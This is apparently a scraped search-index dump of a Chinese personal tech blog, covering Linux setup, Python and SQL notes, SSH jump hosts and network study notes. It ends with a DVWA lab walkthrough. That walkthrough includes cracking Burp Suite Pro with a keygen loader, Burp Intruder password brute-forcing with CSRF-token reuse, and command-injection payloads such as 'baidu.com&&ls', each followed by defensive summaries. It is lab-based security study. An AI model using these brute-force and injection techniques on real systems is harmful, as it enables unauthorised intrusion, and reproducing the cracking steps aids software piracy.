命令，结果均为zsh，除了环境，我不知道有什么能够造成两边结果不同。\n","date":"2023-01-07","permalink":"/posts/kali-linux-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","section":"文章列表","summary":"kali linux 环境配置\u003e kali linux 环境配置 # 起源于一次hadoop的安装和环境配置\n因为环境调了很久，具体的细节记不清了，\n一直在几个文件中反复横跳\nvim ~/.local_profile\nvim /etc/profile\nvim ~/.zshrc\nvim ~/.bashrc\nvim /etc/profile.d/my_env.sh\n期间出过一些异常情况：\n重启控制台环境就失效\nxshell下使用普通用户kali运行hadoop可以识别命令，但是同一时间在虚拟机中无法识别命令；\n普通用户可以识别但是root不能识别，或者root能识别但是普通用户不能识别\n重启之后普通用户的JAVA_HOME不见了，但是root的还在\nsource了之后控制台发生变化\n猜测source /etc/profile和source ~/.zshrc 可以改变当前的环境，因此会出现source ~/.","title":"Kali Linux 环境配置"},{"content":"","date":"2023-01-07","permalink":"/tags/linux/","section":"Tags","summary":"","title":"linux"},{"content":"使用一个git项目进行备份\u003e 使用一个git项目进行备份 # mkdir gitclone cd gitclone\ngit clone git@github.com:Jrebort/Linux-System-BackupTool.git ","date":"2023-01-07","permalink":"/posts/linux%E5%A4%87%E4%BB%BD/","section":"文章列表","summary":"使用一个git项目进行备份\u003e 使用一个git项目进行备份 # mkdir gitclone cd gitclone\ngit clone git@github.com:Jrebort/Linux-System-BackupTool.git ","title":"Linux备份"},{"content":"","date":"2023-01-07","permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"两处错误\n用open打开一个文件，此时调用的是w写入模式，下面使用read是没有权限的，得使用w+读写模式 使用write写入一个字符s，但是此时并没有真正的写入，而是还存在与内存中。此时执行read读取的为空字符。需要执行a.close()以后，再使用a=open(“D://2.txt”) a.read()才能够读取到数据。 ","date":"2023-01-07","permalink":"/posts/python%E9%87%8D%E5%AE%9A%E5%90%91%E8%BE%93%E5%85%A5notreadable/","section":"文章列表","summary":"两处错误\n用open打开一个文件，此时调用的是w写入模式，下面使用read是没有权限的，得使用w+读写模式 使用write写入一个字符s，但是此时并没有真正的写入，而是还存在与内存中。此时执行read读取的为空字符。需要执行a.close()以后，再使用a=open(“D://2.txt”) a.read()才能够读取到数据。 ","title":"Python重定向输入notreadable"},{"content":" while True: # 获取数据 line = input(\u0026#34;请输入学生的姓名，性别，年龄，语文成绩，数学成绩，英语成绩（输入-1时退出）：\u0026#34;) if line == \u0026#39;-1\u0026#39;: print(\u0026#34;已退出\u0026#34;) break # rows.append(tuple(line)) line = tuple(line.split(\u0026#39;,\u0026#39;)) rows.append(line) rows.append(tuple(line)) 如果直接如此，则一个字符为一个元素\n[(\u0026lsquo;a\u0026rsquo;, \u0026rsquo;m\u0026rsquo;, \u0026lsquo;y\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;w\u0026rsquo;, \u0026rsquo;e\u0026rsquo;, \u0026rsquo;m\u0026rsquo;, \u0026lsquo;a\u0026rsquo;, \u0026rsquo;n\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;1\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;5\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;5\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;5\u0026rsquo;)]\nline = tuple(line.split(',')) 应该这样写，会以逗号为分隔符确定元素\n(\u0026lsquo;amy\u0026rsquo;, \u0026lsquo;weman\u0026rsquo;, \u0026lsquo;18\u0026rsquo;, \u0026lsquo;85\u0026rsquo;, \u0026lsquo;85\u0026rsquo;, \u0026lsquo;85\u0026rsquo;)\n","date":"2023-01-07","permalink":"/posts/python%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%B8%BA%E5%85%83%E7%BB%84%E5%86%8D%E6%B7%BB%E5%8A%A0%E8%BF%9B%E5%88%97%E8%A1%A8/","section":"文章列表","summary":"while True: # 获取数据 line = input(\u0026#34;请输入学生的姓名，性别，年龄，语文成绩，数学成绩，英语成绩（输入-1时退出）：\u0026#34;) if line == \u0026#39;-1\u0026#39;: print(\u0026#34;已退出\u0026#34;) break # rows.append(tuple(line)) line = tuple(line.split(\u0026#39;,\u0026#39;)) rows.append(line) rows.append(tuple(line)) 如果直接如此，则一个字符为一个元素\n[(\u0026lsquo;a\u0026rsquo;, \u0026rsquo;m\u0026rsquo;, \u0026lsquo;y\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;w\u0026rsquo;, \u0026rsquo;e\u0026rsquo;, \u0026rsquo;m\u0026rsquo;, \u0026lsquo;a\u0026rsquo;, \u0026rsquo;n\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;1\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;5\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;5\u0026rsquo;, \u0026lsquo;,\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;5\u0026rsquo;)]","title":"Python字符串转为元组再添加进列表"},{"content":"rval = send(rval, buf, strlen(buf) + 1, 0);//error 10038 WSAENOTSOCK //无效套接字上的套接字操作。任何一个把SOCKET句柄当作参数的Winsock函数都会返回这个错误。它表明提供的套接字句柄无效。 magsock才是获得连接的套接字\nrval 改为 msgsock\n而msgsock = accept(sock, (struct sockaddr*)\u0026amp;tcpaddr, (int*)\u0026amp;len);\n","date":"2023-01-07","permalink":"/posts/rval%E6%AF%8F%E6%AC%A1%E9%83%BD%E8%BF%94%E5%9B%9E-1/","section":"文章列表","summary":"rval = send(rval, buf, strlen(buf) + 1, 0);//error 10038 WSAENOTSOCK //无效套接字上的套接字操作。任何一个把SOCKET句柄当作参数的Winsock函数都会返回这个错误。它表明提供的套接字句柄无效。 magsock才是获得连接的套接字\nrval 改为 msgsock\n而msgsock = accept(sock, (struct sockaddr*)\u0026amp;tcpaddr, (int*)\u0026amp;len);","title":"Rval每次都返回 1"},{"content":"","date":"2023-01-07","permalink":"/tags/sql/","section":"Tags","summary":"","title":"SQL"},{"content":"表结构\n查询选修了“苏亚步”教师开设课程的所有学生的学号和姓名\n统计每一年龄选修课程的学生人数\ndate如何输入数据\u003e date如何输入数据 # 按照格式，以字符串形式输入\ncreate table students( 学号 int not null primary key, 姓名 varchar(20), 性别 varchar(5), 年龄 int, 所在院系 varchar(50), 班级名 varchar(50), 入学日期 date, ); insert into students values(20009001,\u0026#39;葛文卿\u0026#39;,\u0026#39;女\u0026#39;,22,\u0026#39;国际贸易\u0026#39;,\u0026#39;国贸2班\u0026#39;,\u0026#39;20000829\u0026#39;), (20014019,\u0026#39;郑秀丽\u0026#39;,\u0026#39;女\u0026#39;,21,\u0026#39;会计学\u0026#39;,\u0026#39;会计1班\u0026#39;,\u0026#39;20010902\u0026#39;), (20023001,\u0026#39;刘成铠\u0026#39;,\u0026#39;男\u0026#39;,18,\u0026#39;计算机\u0026#39;,\u0026#39;软件2班\u0026#39;,\u0026#39;20020827\u0026#39;), (20026002 ,\u0026#39;李涛\u0026#39;,\u0026#39;女\u0026#39;,19,\u0026#39;电子学\u0026#39;,\u0026#39;电子1班\u0026#39;,\u0026#39;20020827\u0026#39;), (20023002 ,\u0026#39;沈香娜\u0026#39;,\u0026#39;女\u0026#39;,19,\u0026#39;计算机\u0026#39;,\u0026#39;软件2班\u0026#39;,\u0026#39;20020827\u0026#39;), (20026003 ,\u0026#39;李涛\u0026#39;,\u0026#39;男\u0026#39;,19,\u0026#39;计算机\u0026#39;,\u0026#39;软件1班\u0026#39;,\u0026#39;20020827\u0026#39;), (20023003 ,\u0026#39;肖一竹\u0026#39;,\u0026#39;女\u0026#39;,19,\u0026#39;计算机\u0026#39;,\u0026#39;软件2班\u0026#39;,\u0026#39;20020827\u0026#39;); ","date":"2023-01-07","permalink":"/posts/sql%E4%B8%89%E8%A1%A8%E8%81%94%E6%9F%A5%E5%88%86%E7%BB%84%E5%8E%BB%E9%87%8D/","section":"文章列表","summary":"表结构\n查询选修了“苏亚步”教师开设课程的所有学生的学号和姓名\n统计每一年龄选修课程的学生人数\ndate如何输入数据\u003e date如何输入数据 # 按照格式，以字符串形式输入\ncreate table students( 学号 int not null primary key, 姓名 varchar(20), 性别 varchar(5), 年龄 int, 所在院系 varchar(50), 班级名 varchar(50), 入学日期 date, ); insert into students values(20009001,\u0026#39;葛文卿\u0026#39;,\u0026#39;女\u0026#39;,22,\u0026#39;国际贸易\u0026#39;,\u0026#39;国贸2班\u0026#39;,\u0026#39;20000829\u0026#39;), (20014019,\u0026#39;郑秀丽\u0026#39;,\u0026#39;女\u0026#39;,21,\u0026#39;会计学\u0026#39;,\u0026#39;会计1班\u0026#39;,\u0026#39;20010902\u0026#39;), (20023001,\u0026#39;刘成铠\u0026#39;,\u0026#39;男\u0026#39;,18,\u0026#39;计算机\u0026#39;,\u0026#39;软件2班\u0026#39;,\u0026#39;20020827\u0026#39;), (20026002 ,\u0026#39;李涛\u0026#39;,\u0026#39;女\u0026#39;,19,\u0026#39;电子学\u0026#39;,\u0026#39;电子1班\u0026#39;,\u0026#39;20020827\u0026#39;), (20023002 ,\u0026#39;沈香娜\u0026#39;,\u0026#39;女\u0026#39;,19,\u0026#39;计算机\u0026#39;,\u0026#39;软件2班\u0026#39;,\u0026#39;20020827\u0026#39;), (20026003 ,\u0026#39;李涛\u0026#39;,\u0026#39;男\u0026#39;,19,\u0026#39;计算机\u0026#39;,\u0026#39;软件1班\u0026#39;,\u0026#39;20020827\u0026#39;), (20023003 ,\u0026#39;肖一竹\u0026#39;,\u0026#39;女\u0026#39;,19,\u0026#39;计算机\u0026#39;,\u0026#39;软件2班\u0026#39;,\u0026#39;20020827\u0026#39;); ","title":"SQL三表联查、分组去重"},{"content":"Debian dpkg、apt、apt-get\ncentos yum、rpm\nkali apt-get、dpkg\nUbuntu apt\n","date":"2023-01-07","permalink":"/posts/%E5%90%84%E4%B8%AAlinux%E5%8F%91%E8%A1%8C%E7%89%88%E4%B8%8B%E8%BD%BD%E8%BD%AF%E4%BB%B6%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/","section":"文章列表","summary":"Debian dpkg、apt、apt-get\ncentos yum、rpm\nkali apt-get、dpkg\nUbuntu apt","title":"各个Linux发行版下载软件常使用的命令"},{"content":"“该扩展程序未列在 Chrome 网上应用店中，并可能是在您不知情的情况下添加的”\n","date":"2023-01-07","permalink":"/posts/%E7%BB%99chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B7%BB%E5%8A%A0%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97%E6%B2%A1%E6%9C%89%E7%9A%84crx%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99/","section":"文章列表","summary":"“该扩展程序未列在 Chrome 网上应用店中，并可能是在您不知情的情况下添加的”","title":"给Chrome浏览器添加应用商店没有的Crx插件报错"},{"content":"printf(\u0026#34;%d\u0026#34;, WSAGetLastError()); 返回值：需要的时候再查\n","date":"2023-01-07","permalink":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8wsagetlasterror/","section":"文章列表","summary":"printf(\u0026#34;%d\u0026#34;, WSAGetLastError()); 返回值：需要的时候再查","title":"如何使用WSAGetLastError"},{"content":"pushd \u0026#34;%~dp0\u0026#34; dir /b C:\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum \u0026gt;List.txt dir /b C:\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum \u0026gt;\u0026gt;List.txt for /f %%i in (\u0026#39;findstr /i . List.txt 2^\u0026gt;nul\u0026#39;) do dism /online /norestart /add-package:\u0026#34;C:\\Windows\\servicing\\Packages\\%%i\u0026#34; ","date":"2023-01-07","permalink":"/posts/%E6%B7%BB%E5%8A%A0%E6%9C%AC%E5%9C%B0%E7%BB%84%E7%AD%96%E7%95%A5/","section":"文章列表","summary":"pushd \u0026#34;%~dp0\u0026#34; dir /b C:\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum \u0026gt;List.txt dir /b C:\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum \u0026gt;\u0026gt;List.txt for /f %%i in (\u0026#39;findstr /i . List.txt 2^\u0026gt;nul\u0026#39;) do dism /online /norestart /add-package:\u0026#34;C:\\Windows\\servicing\\Packages\\%%i\u0026#34; ","title":"添加本地组策略"},{"content":"ProxyJump 通过跳板机连接内网服务器\u003e ProxyJump 通过跳板机连接内网服务器 # 本来使用的是xshell，但是经过一通操作，发现xshell连不上，但是直接命令行可以连，于是直接用powershell来操作了\nProxyJump\u003e ProxyJump # 需要 OpenSSH 7.3 以上版本才可以使用 ProxyJump, 使用下列命令查看OpenSSH 版本：\n$ ssh -V ProxyJump 命令行使用方法：\nssh -J [email protected]:port1,[email protected]:port2 可以直接使用上述命令通过跳板机直接登录内网机器，比如：\nssh username@目标机器IP -p 22 -J username@跳板机IP:22 如果需要通过多个跳板机则以 , 分割：\nssh username@目标机器IP -p 22 -J username1@跳板机IP1:22,username2@跳板机IP2:22 如果你觉得每次都需要加上 -J 的配置很多麻烦，可以写到配置文件里。修改配置文件 ~\\.ssh\\config，默认没有需要自己创建。增加以下内容：\nHost tiaoban1 # 代表跳板机 1 为跳板机器一个“别名”方便使用： HostName 跳板机 1 的 IP Port 22 # ssh 连接端口 User username1 # 跳板机 1 的用户名 Host tiaoban2 # 代表跳板机 2 HostName 跳板机 2 的 IP Port 22 # ssh 连接端口 User username2 # 跳板机 2 的用户名 Host target # 代表目标机器的名字 HostName 目标机器 IP # 这个是目标机器的 IP Port 22 # 目标机器 ssh 的端口 User username_target # 目标机器的用户名 ProxyJump tiaoban1,tiaoban2 Host 10.10.0.* # 使用通配符 * 代表 10.10.0.1 - 10.10.0.255 Port 22 # 服务器端口 User username # 服务器用户名 ProxyJump tiaoban1,tiaoban2 使用方法：\nssh target ssh 10.10.0.1 ssh username@target -p22 ssh username@10.10.0.1 -p22 ","date":"2023-01-07","permalink":"/posts/%E9%80%9A%E8%BF%87%E8%B7%B3%E6%9D%BF%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8/","section":"文章列表","summary":"ProxyJump 通过跳板机连接内网服务器\u003e ProxyJump 通过跳板机连接内网服务器 # 本来使用的是xshell，但是经过一通操作，发现xshell连不上，但是直接命令行可以连，于是直接用powershell来操作了\nProxyJump\u003e ProxyJump # 需要 OpenSSH 7.3 以上版本才可以使用 ProxyJump, 使用下列命令查看OpenSSH 版本：\n$ ssh -V ProxyJump 命令行使用方法：\nssh -J [email protected]:port1,[email protected]:port2 可以直接使用上述命令通过跳板机直接登录内网机器，比如：\nssh username@目标机器IP -p 22 -J username@跳板机IP:22 如果需要通过多个跳板机则以 , 分割：","title":"通过跳板机连接内网服务器"},{"content":"","date":"2023-01-03","permalink":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","section":"Tags","summary":"","title":"计算机网络"},{"content":"chapter 1 Computer Networks and the Internet\u003e chapter 1 Computer Networks and the Internet # chapter 1 Computer Networks and the Internet\ninterconnects 互相连接\nIntranet 内网\ntwisted-pair copper wire 双绞铜线\na coaxial cable 同轴电缆\nfiber optics 光纤\ndigital satellite channel 数字卫星信道\nguided media 导引性介质\ngeostationary satellite 地球静止卫星\nlow-altitude satellite 低空卫星\nlow-earth orbiting 近地轨道\nmessage 报文 （应用层）\nframes 帧 （链路层）\nSegments 报文段 （传输层）\nDatagrams 数据报 / 分组（网络层）\nbit streams 比特流 （物理层）\ncircuit-switched networks 电路交换网络\npacket Switching 分组交换\noverwhelms 淹没\nCongestion control 拥塞控制\nStore-and-forward transmission 存储转发传输\nreceive the entire packet before it can begin to transmit the first bit of the packet onto the outbound link（出站链路）.\nprocessing delay 处理时延\npropagation delay 传播时延（和距离有关）\nexamine 核验\ntraffic intensity 流量强度\nfraction 比率\nloosely classified into three categories 大致划分为三种类型\nno greater than 不大于\nequivalent concept 相同的概念\nresidential access 住宅接入\ndistributed applications 分布式应用程序\ncorporate 公司\nconnection-oriented 面向连接的\nanalog signals 模拟信号\nproper order 按序\ngridlock 交通堵塞\napproaches 构建\nalong a path 保留一条链路 （电路交换的特点）\ndemand 需要\nas a consequence 因此\nChapter 2 Application Layer\u003e Chapter 2 Application Layer # Chapter 2 Application Layer\nis labeled as 被标记为\nclient process: process that initiates communication.\nserver process:process that waits to be contracted.\nloss-tolerant application 遗失容忍性App\nreal-time audio/video(实时音视频)\nstored audio/video（存储音视频）\ninteractive games.（互动游戏）\nbandwidth-sensitive 带宽敏感\nelastic application 弹性应用（对吞吐量要求不高）\nunderlying transport protocol 基础传输协议\npersistent connection without pipelining 流水线持久连接\nRTT的计算\non the behalf of 代表\nparallel 并行\nparameter 参数\npush 推 pull 拉\nstateless\nPOP3\nHost aliasing 主机别名\nMail server aliasing 邮件服务器别名\nLoad distribution 负载分配\noverlay network 覆盖网络\nQuery Flooding 洪泛查询\nincentive priorities 激励优先\nparallel downloading 并行下载\nraise 增加 reduce 减少\nrecipient’s 收件人的\nphases 状态\nauthorization, transaction and update 授权 事务 更新\nhighly scalable 高可扩展性\nspecifies 指定\nindicates 指出\nsession 会话\ndistinguish 区分\nChapter 3 Transport Layer\u003e Chapter 3 Transport Layer # Chapter 3 Transport Layer\nmultiplexing and demultiplexing 多路复用和多路分解 corrupt 破坏 cumilative 累加的 full duplex 全双工 perceive congestion 感知拥塞 either A or B A或B forwarding and filtering 转发和过滤（链路层交换机） swiching and routing 交换和路由（网络层路由器） MSS maximum segment 最大报文段长度 MTU maximum transmission unit 链路层最大帧长度 grab 抓取 employs 使用 reassembles 重新组装 finer 出色的 detection 检测 correct 更正 plot 图 threshold 阈值 latency 延迟 chapter 4\u003e chapter 4 # topology 拓扑 reassemly 重组 知识点\u003e 知识点 # 端口\u003e 端口 # 20 and 21 FTP 22 SSH 25 SMTP 53 DNS 80 HTTP 443 HTTPS 110 POP3 network architecture\u003e network architecture # CS\nP2P\nCB\nnetwork architecture is fixed. 网络架构是固定的。\nnetwork architecture provides a specific set of services to application.\n网络体系结构为应用程序提供了一组特定的服务。\nThe network architecture is designed by application developer.\n网络体系结构由应用程序开发人员设计。\n有无状态\u003e 有无状态 # 有状态\nFTP SMTP 无状态\nhttp POP3 各层的服务对象\u003e 各层的服务对象 # 应用层——应用——报文 传输层——进程——报文段 网络层——端——数据报、分组 链路层——各种结点，如：路由器——帧 物理层————比特流 port number\u003e port number # 范围 0-65535 固定 0-1023 socket 信息\u003e socket 信息 # tcp 目标IP+目标socket+源IP+源socket （4 tuple） udp 目标IP+目标socket （2 tuple） 一个进程可以对应多个socket，但是一个socket只能对应一个进程 若两个udp报文段有不同源，但只要目标相同，都通过同一个socket rdt演变\u003e rdt演变 # rdt 1.0 完全可靠信道 rdt 2.0 具有比特差错，假设ACK和NAK无损 使用ACK和NAK建立自动重传请求ARQ 停等协议：每发送一个分组都要接受端的确认信号 rdt 2.1 解决rdt 2.0 信号受损 给分组设置序号 rdt 2.2 只有ACK没有NAK rdt 3.0 比特差错和分组丢失 超时重传 rdt 3.0 改良 rdt3.0性能太低 引入流水线协议 差错恢复（GBN\\SR） TCP\u003e TCP # 服务\u003e 服务 # 提供 reliable transport ; flow control; congestion control; connection-oriented. 不提供 timing、delay guarantee minimum throughput guarantee; security 标志\u003e 标志 # SYN 连接建立 FIN 连接释放 特点\u003e 特点 # 点对点，不能多播 全双工 三次握手 确保客户端活跃 四次挥手 因为是全双工 UDP\u003e UDP # 头部字段 source port number destination port number length checksum 校验和\u003e 校验和 # 1110 0110 0110 0110 ①\n1101 0101 0101 0101 ②\n1 1011 1011 1011 1011 ①+②\n1011 1011 1011 1100 反卷\n去掉头部的1\n整体再加1\n0100 0100 0100 0011 ③校验和结果\n验证：①+②+③ = 全1（没出错）\nMSS MTU的关系\u003e MSS MTU的关系 # MSS的大小根据MTU的大小确认\nMSS + TCP\\IP首部长度 \u0026lt;= MTU\n往返时间估计\u003e 往返时间估计 # EST RTT = (1-a) EST RTT + a * Sam RTT\nSam RTT 一次往返时间\n接收窗口计算\u003e 接收窗口计算 # rwnd = RcvBuffer - （LastByteRcvd - LastByteRead）\n","date":"2023-01-03","permalink":"/docs/%E8%AE%A1%E7%BD%91%E8%8B%B1%E6%96%87%E5%A4%8D%E4%B9%A0/","section":"Docs","summary":"chapter 1 Computer Networks and the Internet\u003e chapter 1 Computer Networks and the Internet # chapter 1 Computer Networks and the Internet\ninterconnects 互相连接\nIntranet 内网\ntwisted-pair copper wire 双绞铜线","title":"计网英文复习"},{"content":"","date":"2023-01-03","permalink":"/posts/","section":"文章列表","summary":"","title":"文章列表"},{"content":"","date":"2023-01-03","permalink":"/series/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"2022-10-11","permalink":"/tags/%E7%88%AC%E8%99%AB/","section":"Tags","summary":"","title":"爬虫"},{"content":"python后台执行\u003e python后台执行 # nohup python -u script.py \u0026gt; log.out \u0026amp;\n这里，\u0026gt; log.out 表示将控制台输出输出到log.out文件中 -u选项表示每多一条信息就实时输出到log.out中，而不是全部输出完毕再输出 \u0026amp;符号表示在后台执行，运行时可以查看日志或者运行\n检查运行状况\u003e 检查运行状况 # ps -ef |grep python\n查看后台运行的python进程\n查看文件大小\u003e 查看文件大小 # ls -ld\n","date":"2022-10-11","permalink":"/posts/%E5%A6%82%E4%BD%95%E9%83%A8%E7%BD%B2%E7%88%AC%E8%99%AB%E7%A8%8B%E5%BA%8F%E5%88%B0%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/","section":"文章列表","summary":"python后台执行\u003e python后台执行 # nohup python -u script.py \u0026gt; log.out \u0026amp;\n这里，\u0026gt; log.out 表示将控制台输出输出到log.out文件中 -u选项表示每多一条信息就实时输出到log.out中，而不是全部输出完毕再输出 \u0026amp;符号表示在后台执行，运行时可以查看日志或者运行\n检查运行状况\u003e 检查运行状况 # ps -ef |grep python\n查看后台运行的python进程\n查看文件大小\u003e 查看文件大小 # ls -ld","title":"如何部署爬虫程序到云服务器上"},{"content":"-rw-r----- 1 root shadow 1514 Nov 24 2020 /etc/shadow\n第一列：字母，表示文件类型和权限\n第一个字母代表文件类型（见附录），后面每三个为一组。\n第一组：所有者权限；\n第二组：组用户权限；\n第三组：其他用户组权限；\n第二列：数字\n如果是目录：这个数字表示当前目录下面一级目录的个数\n如果是文件：数字表示硬链接个数（底层存放一份，但是却有多个不同的名字，修改其中一个都会影响到其他的）\n第三列：所有者\n第四列：表示所属的组\n第五列：文件大小\n第六七八列：最后修改文件的日期\n第九列：文件路径\n附录\u003e 附录 # 1. 文件类型\u003e 1. 文件类型 # d：目录文件 -：普通文件 p：管理文件 l：链接文件 b：块设备文件 c：字符设备文件 s：套接字文件 2. 权限种类\u003e 2. 权限种类 # r：读 w：写（不可删除） x：执行 对文件来说，代表能否进入目录 s或S（Set UID）：对权限文件生效，s代表x，S代表无 t或T（Sticky）：一般用在目录上 ","date":"2022-09-07","permalink":"/posts/linux%E6%96%87%E4%BB%B6%E8%AF%A6%E6%83%85/","section":"文章列表","summary":"-rw-r----- 1 root shadow 1514 Nov 24 2020 /etc/shadow\n第一列：字母，表示文件类型和权限\n第一个字母代表文件类型（见附录），后面每三个为一组。\n第一组：所有者权限；\n第二组：组用户权限；\n第三组：其他用户组权限；\n第二列：数字\n如果是目录：这个数字表示当前目录下面一级目录的个数\n如果是文件：数字表示硬链接个数（底层存放一份，但是却有多个不同的名字，修改其中一个都会影响到其他的）\n第三列：所有者\n第四列：表示所属的组\n第五列：文件大小\n第六七八列：最后修改文件的日期\n第九列：文件路径\n附录\u003e 附录 # 1. 文件类型\u003e 1. 文件类型 # d：目录文件 -：普通文件 p：管理文件 l：链接文件 b：块设备文件 c：字符设备文件 s：套接字文件 2.","title":"Linux文件详情"},{"content":"","date":"2022-09-03","permalink":"/tags/dvwa/","section":"Tags","summary":"","title":"DVWA"},{"content":"环境搭建\u003e 环境搭建 # kali + docker\ndocker run --rm -it -p 80:80 vulnerables/web-dvwa 打开网页 http://127.0.0.1/index.php\n点击Create / Reset database\nUsername：admin Password：password\n安装及配置BurpSuite\u003e 安装及配置BurpSuite # 下载所需要的文件\nReleases · h3110w0r1d-y/BurpLoaderKeygen (github.com)\n​\tBurp Suite Release Notes (portswigger.net)\n​ Java Downloads | Oracle\n配置JDK11\ntar -xzvf jdk-8u191-linux-x64.tar.gz sudo cp -r jdk1.8.0_191 /opt cd /opt/jdk1.8.0_191 touch ~/.local_profile #创建公共脚本 vim ~/.local_profile #写入环境变量 #install JAVA JDK11 export JAVA_HOME=/opt/jdk-11.0.17 export CLASSPATH=.:${JAVA_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH source /etc/profile source ~/.zshrc # 使环境生效 java -version # 验证是否成功 破解bs\n将文件拷贝到/usr/bin目录中\nsudo cp -r BurpLoaderKeygen.jar burpsuite_pro_v2022.9.5.jar /usr/bin 激活\n进入/usr/bin\ncd /usr/bin 启动激活程序(jar程序启动通用命令)\njava -jar BurpLoaderKeygen.jar 点击run\n点击next\n点击Manual activation完成手动激活\n启动\njava -javaagent:/usr/bin/BurpLoaderKeygen.jar -noverify -jar /usr/bin/burpsuite_pro_v2022.9.5.jar\n配置bs代理\n密码爆破\u003e 密码爆破 # low\u003e low # 提交请求，使用bs抓包\n观察提交网址 http://127.0.0.1/vulnerabilities/brute/?username=admin\u0026amp;password=password\u0026amp;Login=Login#\n可知道在/vulnerabilities/brute/路径下找到包内容\n使用bs内置的工具 Intruder (入侵者)\n标记需要替换的内容，不需要替换的取消标记\n告诉bs以何种方式替换（攻击类型）以及替换成什么数据（字典）\nSniper\n替换一个参数\nBattering ram\n适合多个参数的值相同\nPitchfork\n多个参数值不同\nCluster bomb\n多个参数值不同，全排列\n给username添加尝试数据\n给password添加尝试数据\n开始攻击\n找出结果，一般情况下正确结果的返回报文长度更长\nmedium\u003e medium # 源码分析\n对比low和medium的源码\n因此，我们还是可以使用low级别的爆破方式来对密码进行爆破\n攻击并找出结果\nhigh\u003e high # 尝试输入错误密码，观察网址\nhttp://127.0.0.1/vulnerabilities/brute/?username=a\u0026amp;password=a\u0026amp;Login=Login\u0026amp;user_token=eef7206a4c0369e0d16c776f9fed38b7#\n会发现多出了一个参数user_token\n将该网址在新标签页中打开，会发现提示token不正确的提示，并且也没有提示密码是否错误\n那么，token哪来的？\n源码分析\nanti-csrf token 一种常见的web应用安全机制，类似验证码和带token的表单\n表单1提交的时候会生成token2，并将这个token2和表单2绑定，当表单2提交就会生成token3，与表单3绑定，以此类推\n因此，我们需要知道初始token，在submit之后自动采集新的token，并附带到下一次的submit。\n那么如何得到初始token？如何采集新token？\n设定为Pitchfork模式，因为每次token不同，不能使用Cluster bomb模式\n选定username、password、user_token三个替换点\n因为每次user_token需要从上次的回应中获取，因此数据列表不能继续使用Simple List类型，得换成Recursive grep\n如何定位token？通过检查元素可以找到\n至此，获取了初始token，然后将其填入Payloads\n点击Options， 因为要顺序发送请求，所以要把线程数调到1\n接下来要获取新产生的token，将其放入下一次请求报文中\n开始攻击，查看结果\nimpossible\u003e impossible # 分析源代码\n同一个账号可以尝试三次密码，超过三次会锁定15分钟\n总结与防御\u003e 总结与防御 # ​\t由于服务器没有对用户的输入次数进行限制，导致攻击者可以利用爆破的手段来进行攻击，通过穷举法将用户名、密码等信息爆出来。当攻击者结合社会工程学生成了庞大的字典时，爆破攻击的可能性将会被增大。对于爆破漏洞，开发者可以对用户的登陆次数设置阈值，当某用户名表示的用户的登录次数在一定时间内超过阈值时，就暂时锁定用户。也可以进行 IP 检测，如果某个 IP 的登录次数超过阈值也可以锁定 IP。当然还有一种我们熟悉的方式，就是设置只有人可以通过验证的验证码或者是其他的验证手法，来保证进行登录操作的是人而不是机器。\ncommand injection命令注入\u003e command injection命令注入 # low\u003e low # 猜测其直接调用系统命令，直接输入baidu.com\u0026amp;\u0026amp;ls，可以看到ls命令也被运行了\nmedium\u003e medium # 输入baidu.com\u0026amp;\u0026amp;ls，没有结果\n分析源码\n可以看到他是做了简单的替换，把\u0026amp;\u0026amp;变成\u0026amp;或者|就可以了\n发起攻击\nhigh\u003e high # 查看源码，可以看到它只过滤了|+空格 ，因此只写一个|也是可以绕过的\n发起攻击\nimpossible\u003e impossible # 输入baidu.com都不行了\n将输入的信息以.分割成四份，分别判断是否是数字\n总结与防御\u003e 总结与防御 # ​\t在一些 Web 程序中需要调用一些执行系统命令的函数，例如 PHP 的 system、exec、shell_exec 函数等。当攻击者能够直接操作命令执行的参数，并且没有代码对传入的参数进行过滤时，攻击者就能将用于搞破坏的系统命令夹带进来让系统执行。 在 Windows 系统和 Linux 系统中都有一些管道符，这些管道符可以被用来拼接攻击指令：\n“\u0026amp;\u0026amp;”：前面的语句正确执行时，才执行后面的语句； “\u0026amp;”：前面的语句执行出错时，执行后面的语句； “|”：将前面的语句运行的结果，当做后面语句的输入，显示后面语句的执行结果； “||”：前面的语句出错时，执行后面的语句。 ​\t对于指令注入漏洞，比较好的防御方式是尽可能别用命令执行函数，对于输入的参数要做好黑名单过滤或者白名单验证。\n跨站请求伪造 